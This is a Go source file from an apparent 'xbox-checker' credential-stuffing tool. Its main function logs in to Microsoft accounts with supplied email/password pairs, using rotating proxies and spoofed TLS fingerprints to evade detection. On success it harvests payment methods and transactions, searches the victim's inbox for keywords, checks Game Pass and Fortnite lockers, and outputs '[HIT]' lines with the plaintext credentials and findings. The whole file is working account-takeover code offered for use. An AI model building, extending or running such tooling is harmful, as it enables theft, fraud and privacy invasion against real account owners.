package xbox

import (
	"encoding/json"
	"fmt"
	http "github.com/bogdanfinn/fhttp"
	"io"
	"net/url"
	"strings"
	"time"

	"xbox-checker/internal/checkercfg"
	"xbox-checker/internal/epic"
	"xbox-checker/internal/mail"
	"xbox-checker/internal/nettls"
	"xbox-checker/internal/payments"
	"xbox-checker/internal/promos"
)

// ExecuteAccountValidation runs the full-capture login flow for one account:
// Microsoft login, payment instruments + transactions, keyword inbox search,
// Game Pass promos, Fortnite locker and account-type classification.
// Returns: formattedHit, isValid, logMsg, shouldRetry.
func ExecuteAccountValidation(email, password, proxyStr string, proxies []string, keywords []string, wfp *nettls.FP, cfg checkercfg.Config) (string, bool, string, bool) {
	if wfp == nil {
		wfp = nettls.NewWorkerFP(0)
	}
	preset := wfp.NextPreset()
	client, oauthClient := nettls.NewPairProfile(proxyStr, 5*time.Second, 5*time.Second, preset.Profile)
	if client == nil {
		return "", false, "", true
	}
	ua := preset.UA
	profile := preset.Profile

	reqInit, err := http.NewRequest("GET", PreflightURL, nil)
	if err != nil {
		return "", false, "", true // soft – retry
	}
	reqInit.Header.Set("User-Agent", ua)

	respInit, err := nettls.Do(client, reqInit)
	if err != nil {
		return "", false, "", true // network / preflight – retry
	}
	bodyInitBytes, _ := io.ReadAll(respInit.Body)
	respInit.Body.Close()
	ppft := nettls.ExtractPPFT(string(bodyInitBytes))

	if ppft == "" {
		return "", false, "", true // PPFT fail – retry
	}

	loginData := url.Values{}
	loginData.Set("i13", "0")
	loginData.Set("login", email)
	loginData.Set("loginfmt", email)
	loginData.Set("type", "11")
	loginData.Set("LoginOptions", "3")
	loginData.Set("passwd", password)
	loginData.Set("ps", "2")
	loginData.Set("PPFT", ppft)
	loginData.Set("NewUser", "1")
	loginData.Set("IsFidoSupported", "1")
	loginData.Set("i19", "36463")

	reqPost, err := http.NewRequest("POST", LoginPostURL, strings.NewReader(loginData.Encode()))
	if err != nil {
		return "", false, "", true
	}
	reqPost.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	reqPost.Header.Set("Origin", "https://login.live.com")
	reqPost.Header.Set("Referer", PreflightURL)

	respPost, err := nettls.Do(client, reqPost)
	if err != nil {
		return "", false, "", true // POST network – retry
	}
	defer respPost.Body.Close()
	bodyBytes, _ := io.ReadAll(respPost.Body)
	bodyStr := string(bodyBytes)

	if strings.Contains(bodyStr, "Your account or password is incorrect") ||
		strings.Contains(bodyStr, "That Microsoft account doesn't exist") {
		// Hard fail – do not retry
		return "", false, fmt.Sprintf("[%s] INVALID: Credentials incorrect.", email), false
	}

	if strings.Contains(bodyStr, "Sign in to your Microsoft account") && strings.Contains(bodyStr, "proof") {
		// Extra proof / challenge – discard, do not retry
		return "", false, "", false
	}

	reqAuth, err := http.NewRequest("GET", OAuthAuthorizeURL, nil)
	if err != nil {
		return "", false, "", true
	}

	if oauthClient == nil {
		oauthClient = nettls.NewClientProfile(proxyStr, 5*time.Second, false, profile)
		if oauthClient == nil {
			return "", false, "", true
		}
		oauthClient.SetCookieJar(client.GetCookieJar())
	}

	respAuth, err := nettls.Do(oauthClient, reqAuth)
	if err != nil {
		return "", false, "", true // OAuth network – retry
	}
	defer respAuth.Body.Close()

	loc := respAuth.Header.Get("Location")
	atk := nettls.ExtractParam(loc, "access_token=")

	if atk == "" {
		// Soft – try the next proxy (capped to one pass through the list)
		return "", false, "", true
	}

	// Fetch Payment Instruments & Transactions
	reqPay, err := http.NewRequest("GET", PaymentInstrumentsURL, nil)
	var payStr string
	if err == nil {
		reqPay.Header.Set("Authorization", fmt.Sprintf("MSADELEGATE1.0=\"%s\"", atk))
		reqPay.Header.Set("Accept", "application/json")
		if respPay, err := nettls.Do(client, reqPay); err == nil {
			defer respPay.Body.Close()
			payBytes, _ := io.ReadAll(respPay.Body)
			payStr = string(payBytes)
		}
	}
	if !cfg.CapPayments {
		payStr = ""
	}

	cashStrs, nonCashActive, removedMethods, countryName := payments.Parse(payStr)

	reqTx, err := http.NewRequest("GET", PaymentTransactionsURL, nil)
	var txStr string
	if err == nil {
		reqTx.Header.Set("Authorization", fmt.Sprintf("MSADELEGATE1.0=\"%s\"", atk))
		reqTx.Header.Set("Accept", "application/json")
		if respTx, err := nettls.Do(client, reqTx); err == nil {
			defer respTx.Body.Close()
			txBytes, _ := io.ReadAll(respTx.Body)
			txStr = string(txBytes)
		}
	}

	services := payments.DetectActiveServices(txStr)

	// ---------- Inbox keyword search (additional step) ----------
	keywordResults := ""
	if cfg.CapKeywords && len(keywords) > 0 {
		counts := mail.SearchInboxForKeywords(email, password, proxyStr, keywords)
		var parts []string
		for _, kw := range keywords {
			if counts[kw] <= 0 {
				continue
			}
			parts = append(parts, fmt.Sprintf("%s %d", strings.TrimSpace(kw), counts[kw]))
		}
		if len(parts) > 0 {
			keywordResults = "Keywords: " + strings.Join(parts, ", ")
		}
	}

	// Formatting Output
	var middleParts []string
	middleParts = append(middleParts, email)
	middleParts = append(middleParts, password)

	if len(cashStrs) > 0 {
		middleParts = append(middleParts, strings.Join(cashStrs, " | "))
	}

	var activePart string
	if len(nonCashActive) > 0 {
		activePart = fmt.Sprintf("Active: [%s]", strings.Join(nonCashActive, " | "))
	} else {
		activePart = "Active: No Active Payment Methods"
	}
	middleParts = append(middleParts, activePart)

	if len(removedMethods) > 0 {
		removedPart := fmt.Sprintf("Inactive: Removed: [%s]", strings.Join(removedMethods, " | "))
		middleParts = append(middleParts, removedPart)
	}

	middleParts = append(middleParts, fmt.Sprintf("Country: %s", countryName))
	middleParts = append(middleParts, fmt.Sprintf("Services: %s", services))

	if keywordResults != "" {
		middleParts = append(middleParts, keywordResults)
	}

	if cfg.CapPromos {
		if promoLine := promos.CheckGamePass(email, password, proxyStr); promoLine != "" {
			middleParts = append(middleParts, promoLine)
		}
	}

	// ---------- Fortnite / Epic locker step ----------
	fnInfo := ""
	if cfg.CapFortnite {
		fnInfo = epic.CheckAccount(email, password, proxyStr)
	}
	start := 0
	if proxyStr != "" && len(proxies) > 0 {
		for i, p := range proxies {
			if p == proxyStr || p == strings.TrimPrefix(strings.TrimPrefix(proxyStr, "http://"), "socks5://") {
				start = i
				break
			}
		}
	}
	if cfg.CapFortnite {
		for attempt := 0; attempt < 3 && epic.Retryable(fnInfo); attempt++ {
			next := proxyStr
			if len(proxies) > 0 {
				next = proxies[(start+1+attempt)%len(proxies)]
			}
			fnInfo = epic.CheckAccount(email, password, next)
		}
	}
	if fnInfo != "" {
		middleParts = append(middleParts, fnInfo)
	}

	acctType := ClassifyAccountType(email, proxyStr)
	if acctType != "" {
		middleParts = append(middleParts, "Account Type: "+acctType)
	}

	formattedResult := strings.Join(middleParts, " | ")
	hitKind := "[HIT]"
	if strings.EqualFold(acctType, "Free") {
		hitKind = "[Free Hit]"
	} else if strings.EqualFold(acctType, "Private") {
		hitKind = "[Private Hit]"
	}
	return formattedResult, true, fmt.Sprintf("%s Successful validation for %s", hitKind, email), false
}

// jsonUnused keeps the json import meaningful if the flow is trimmed.
var _ = json.Marshal
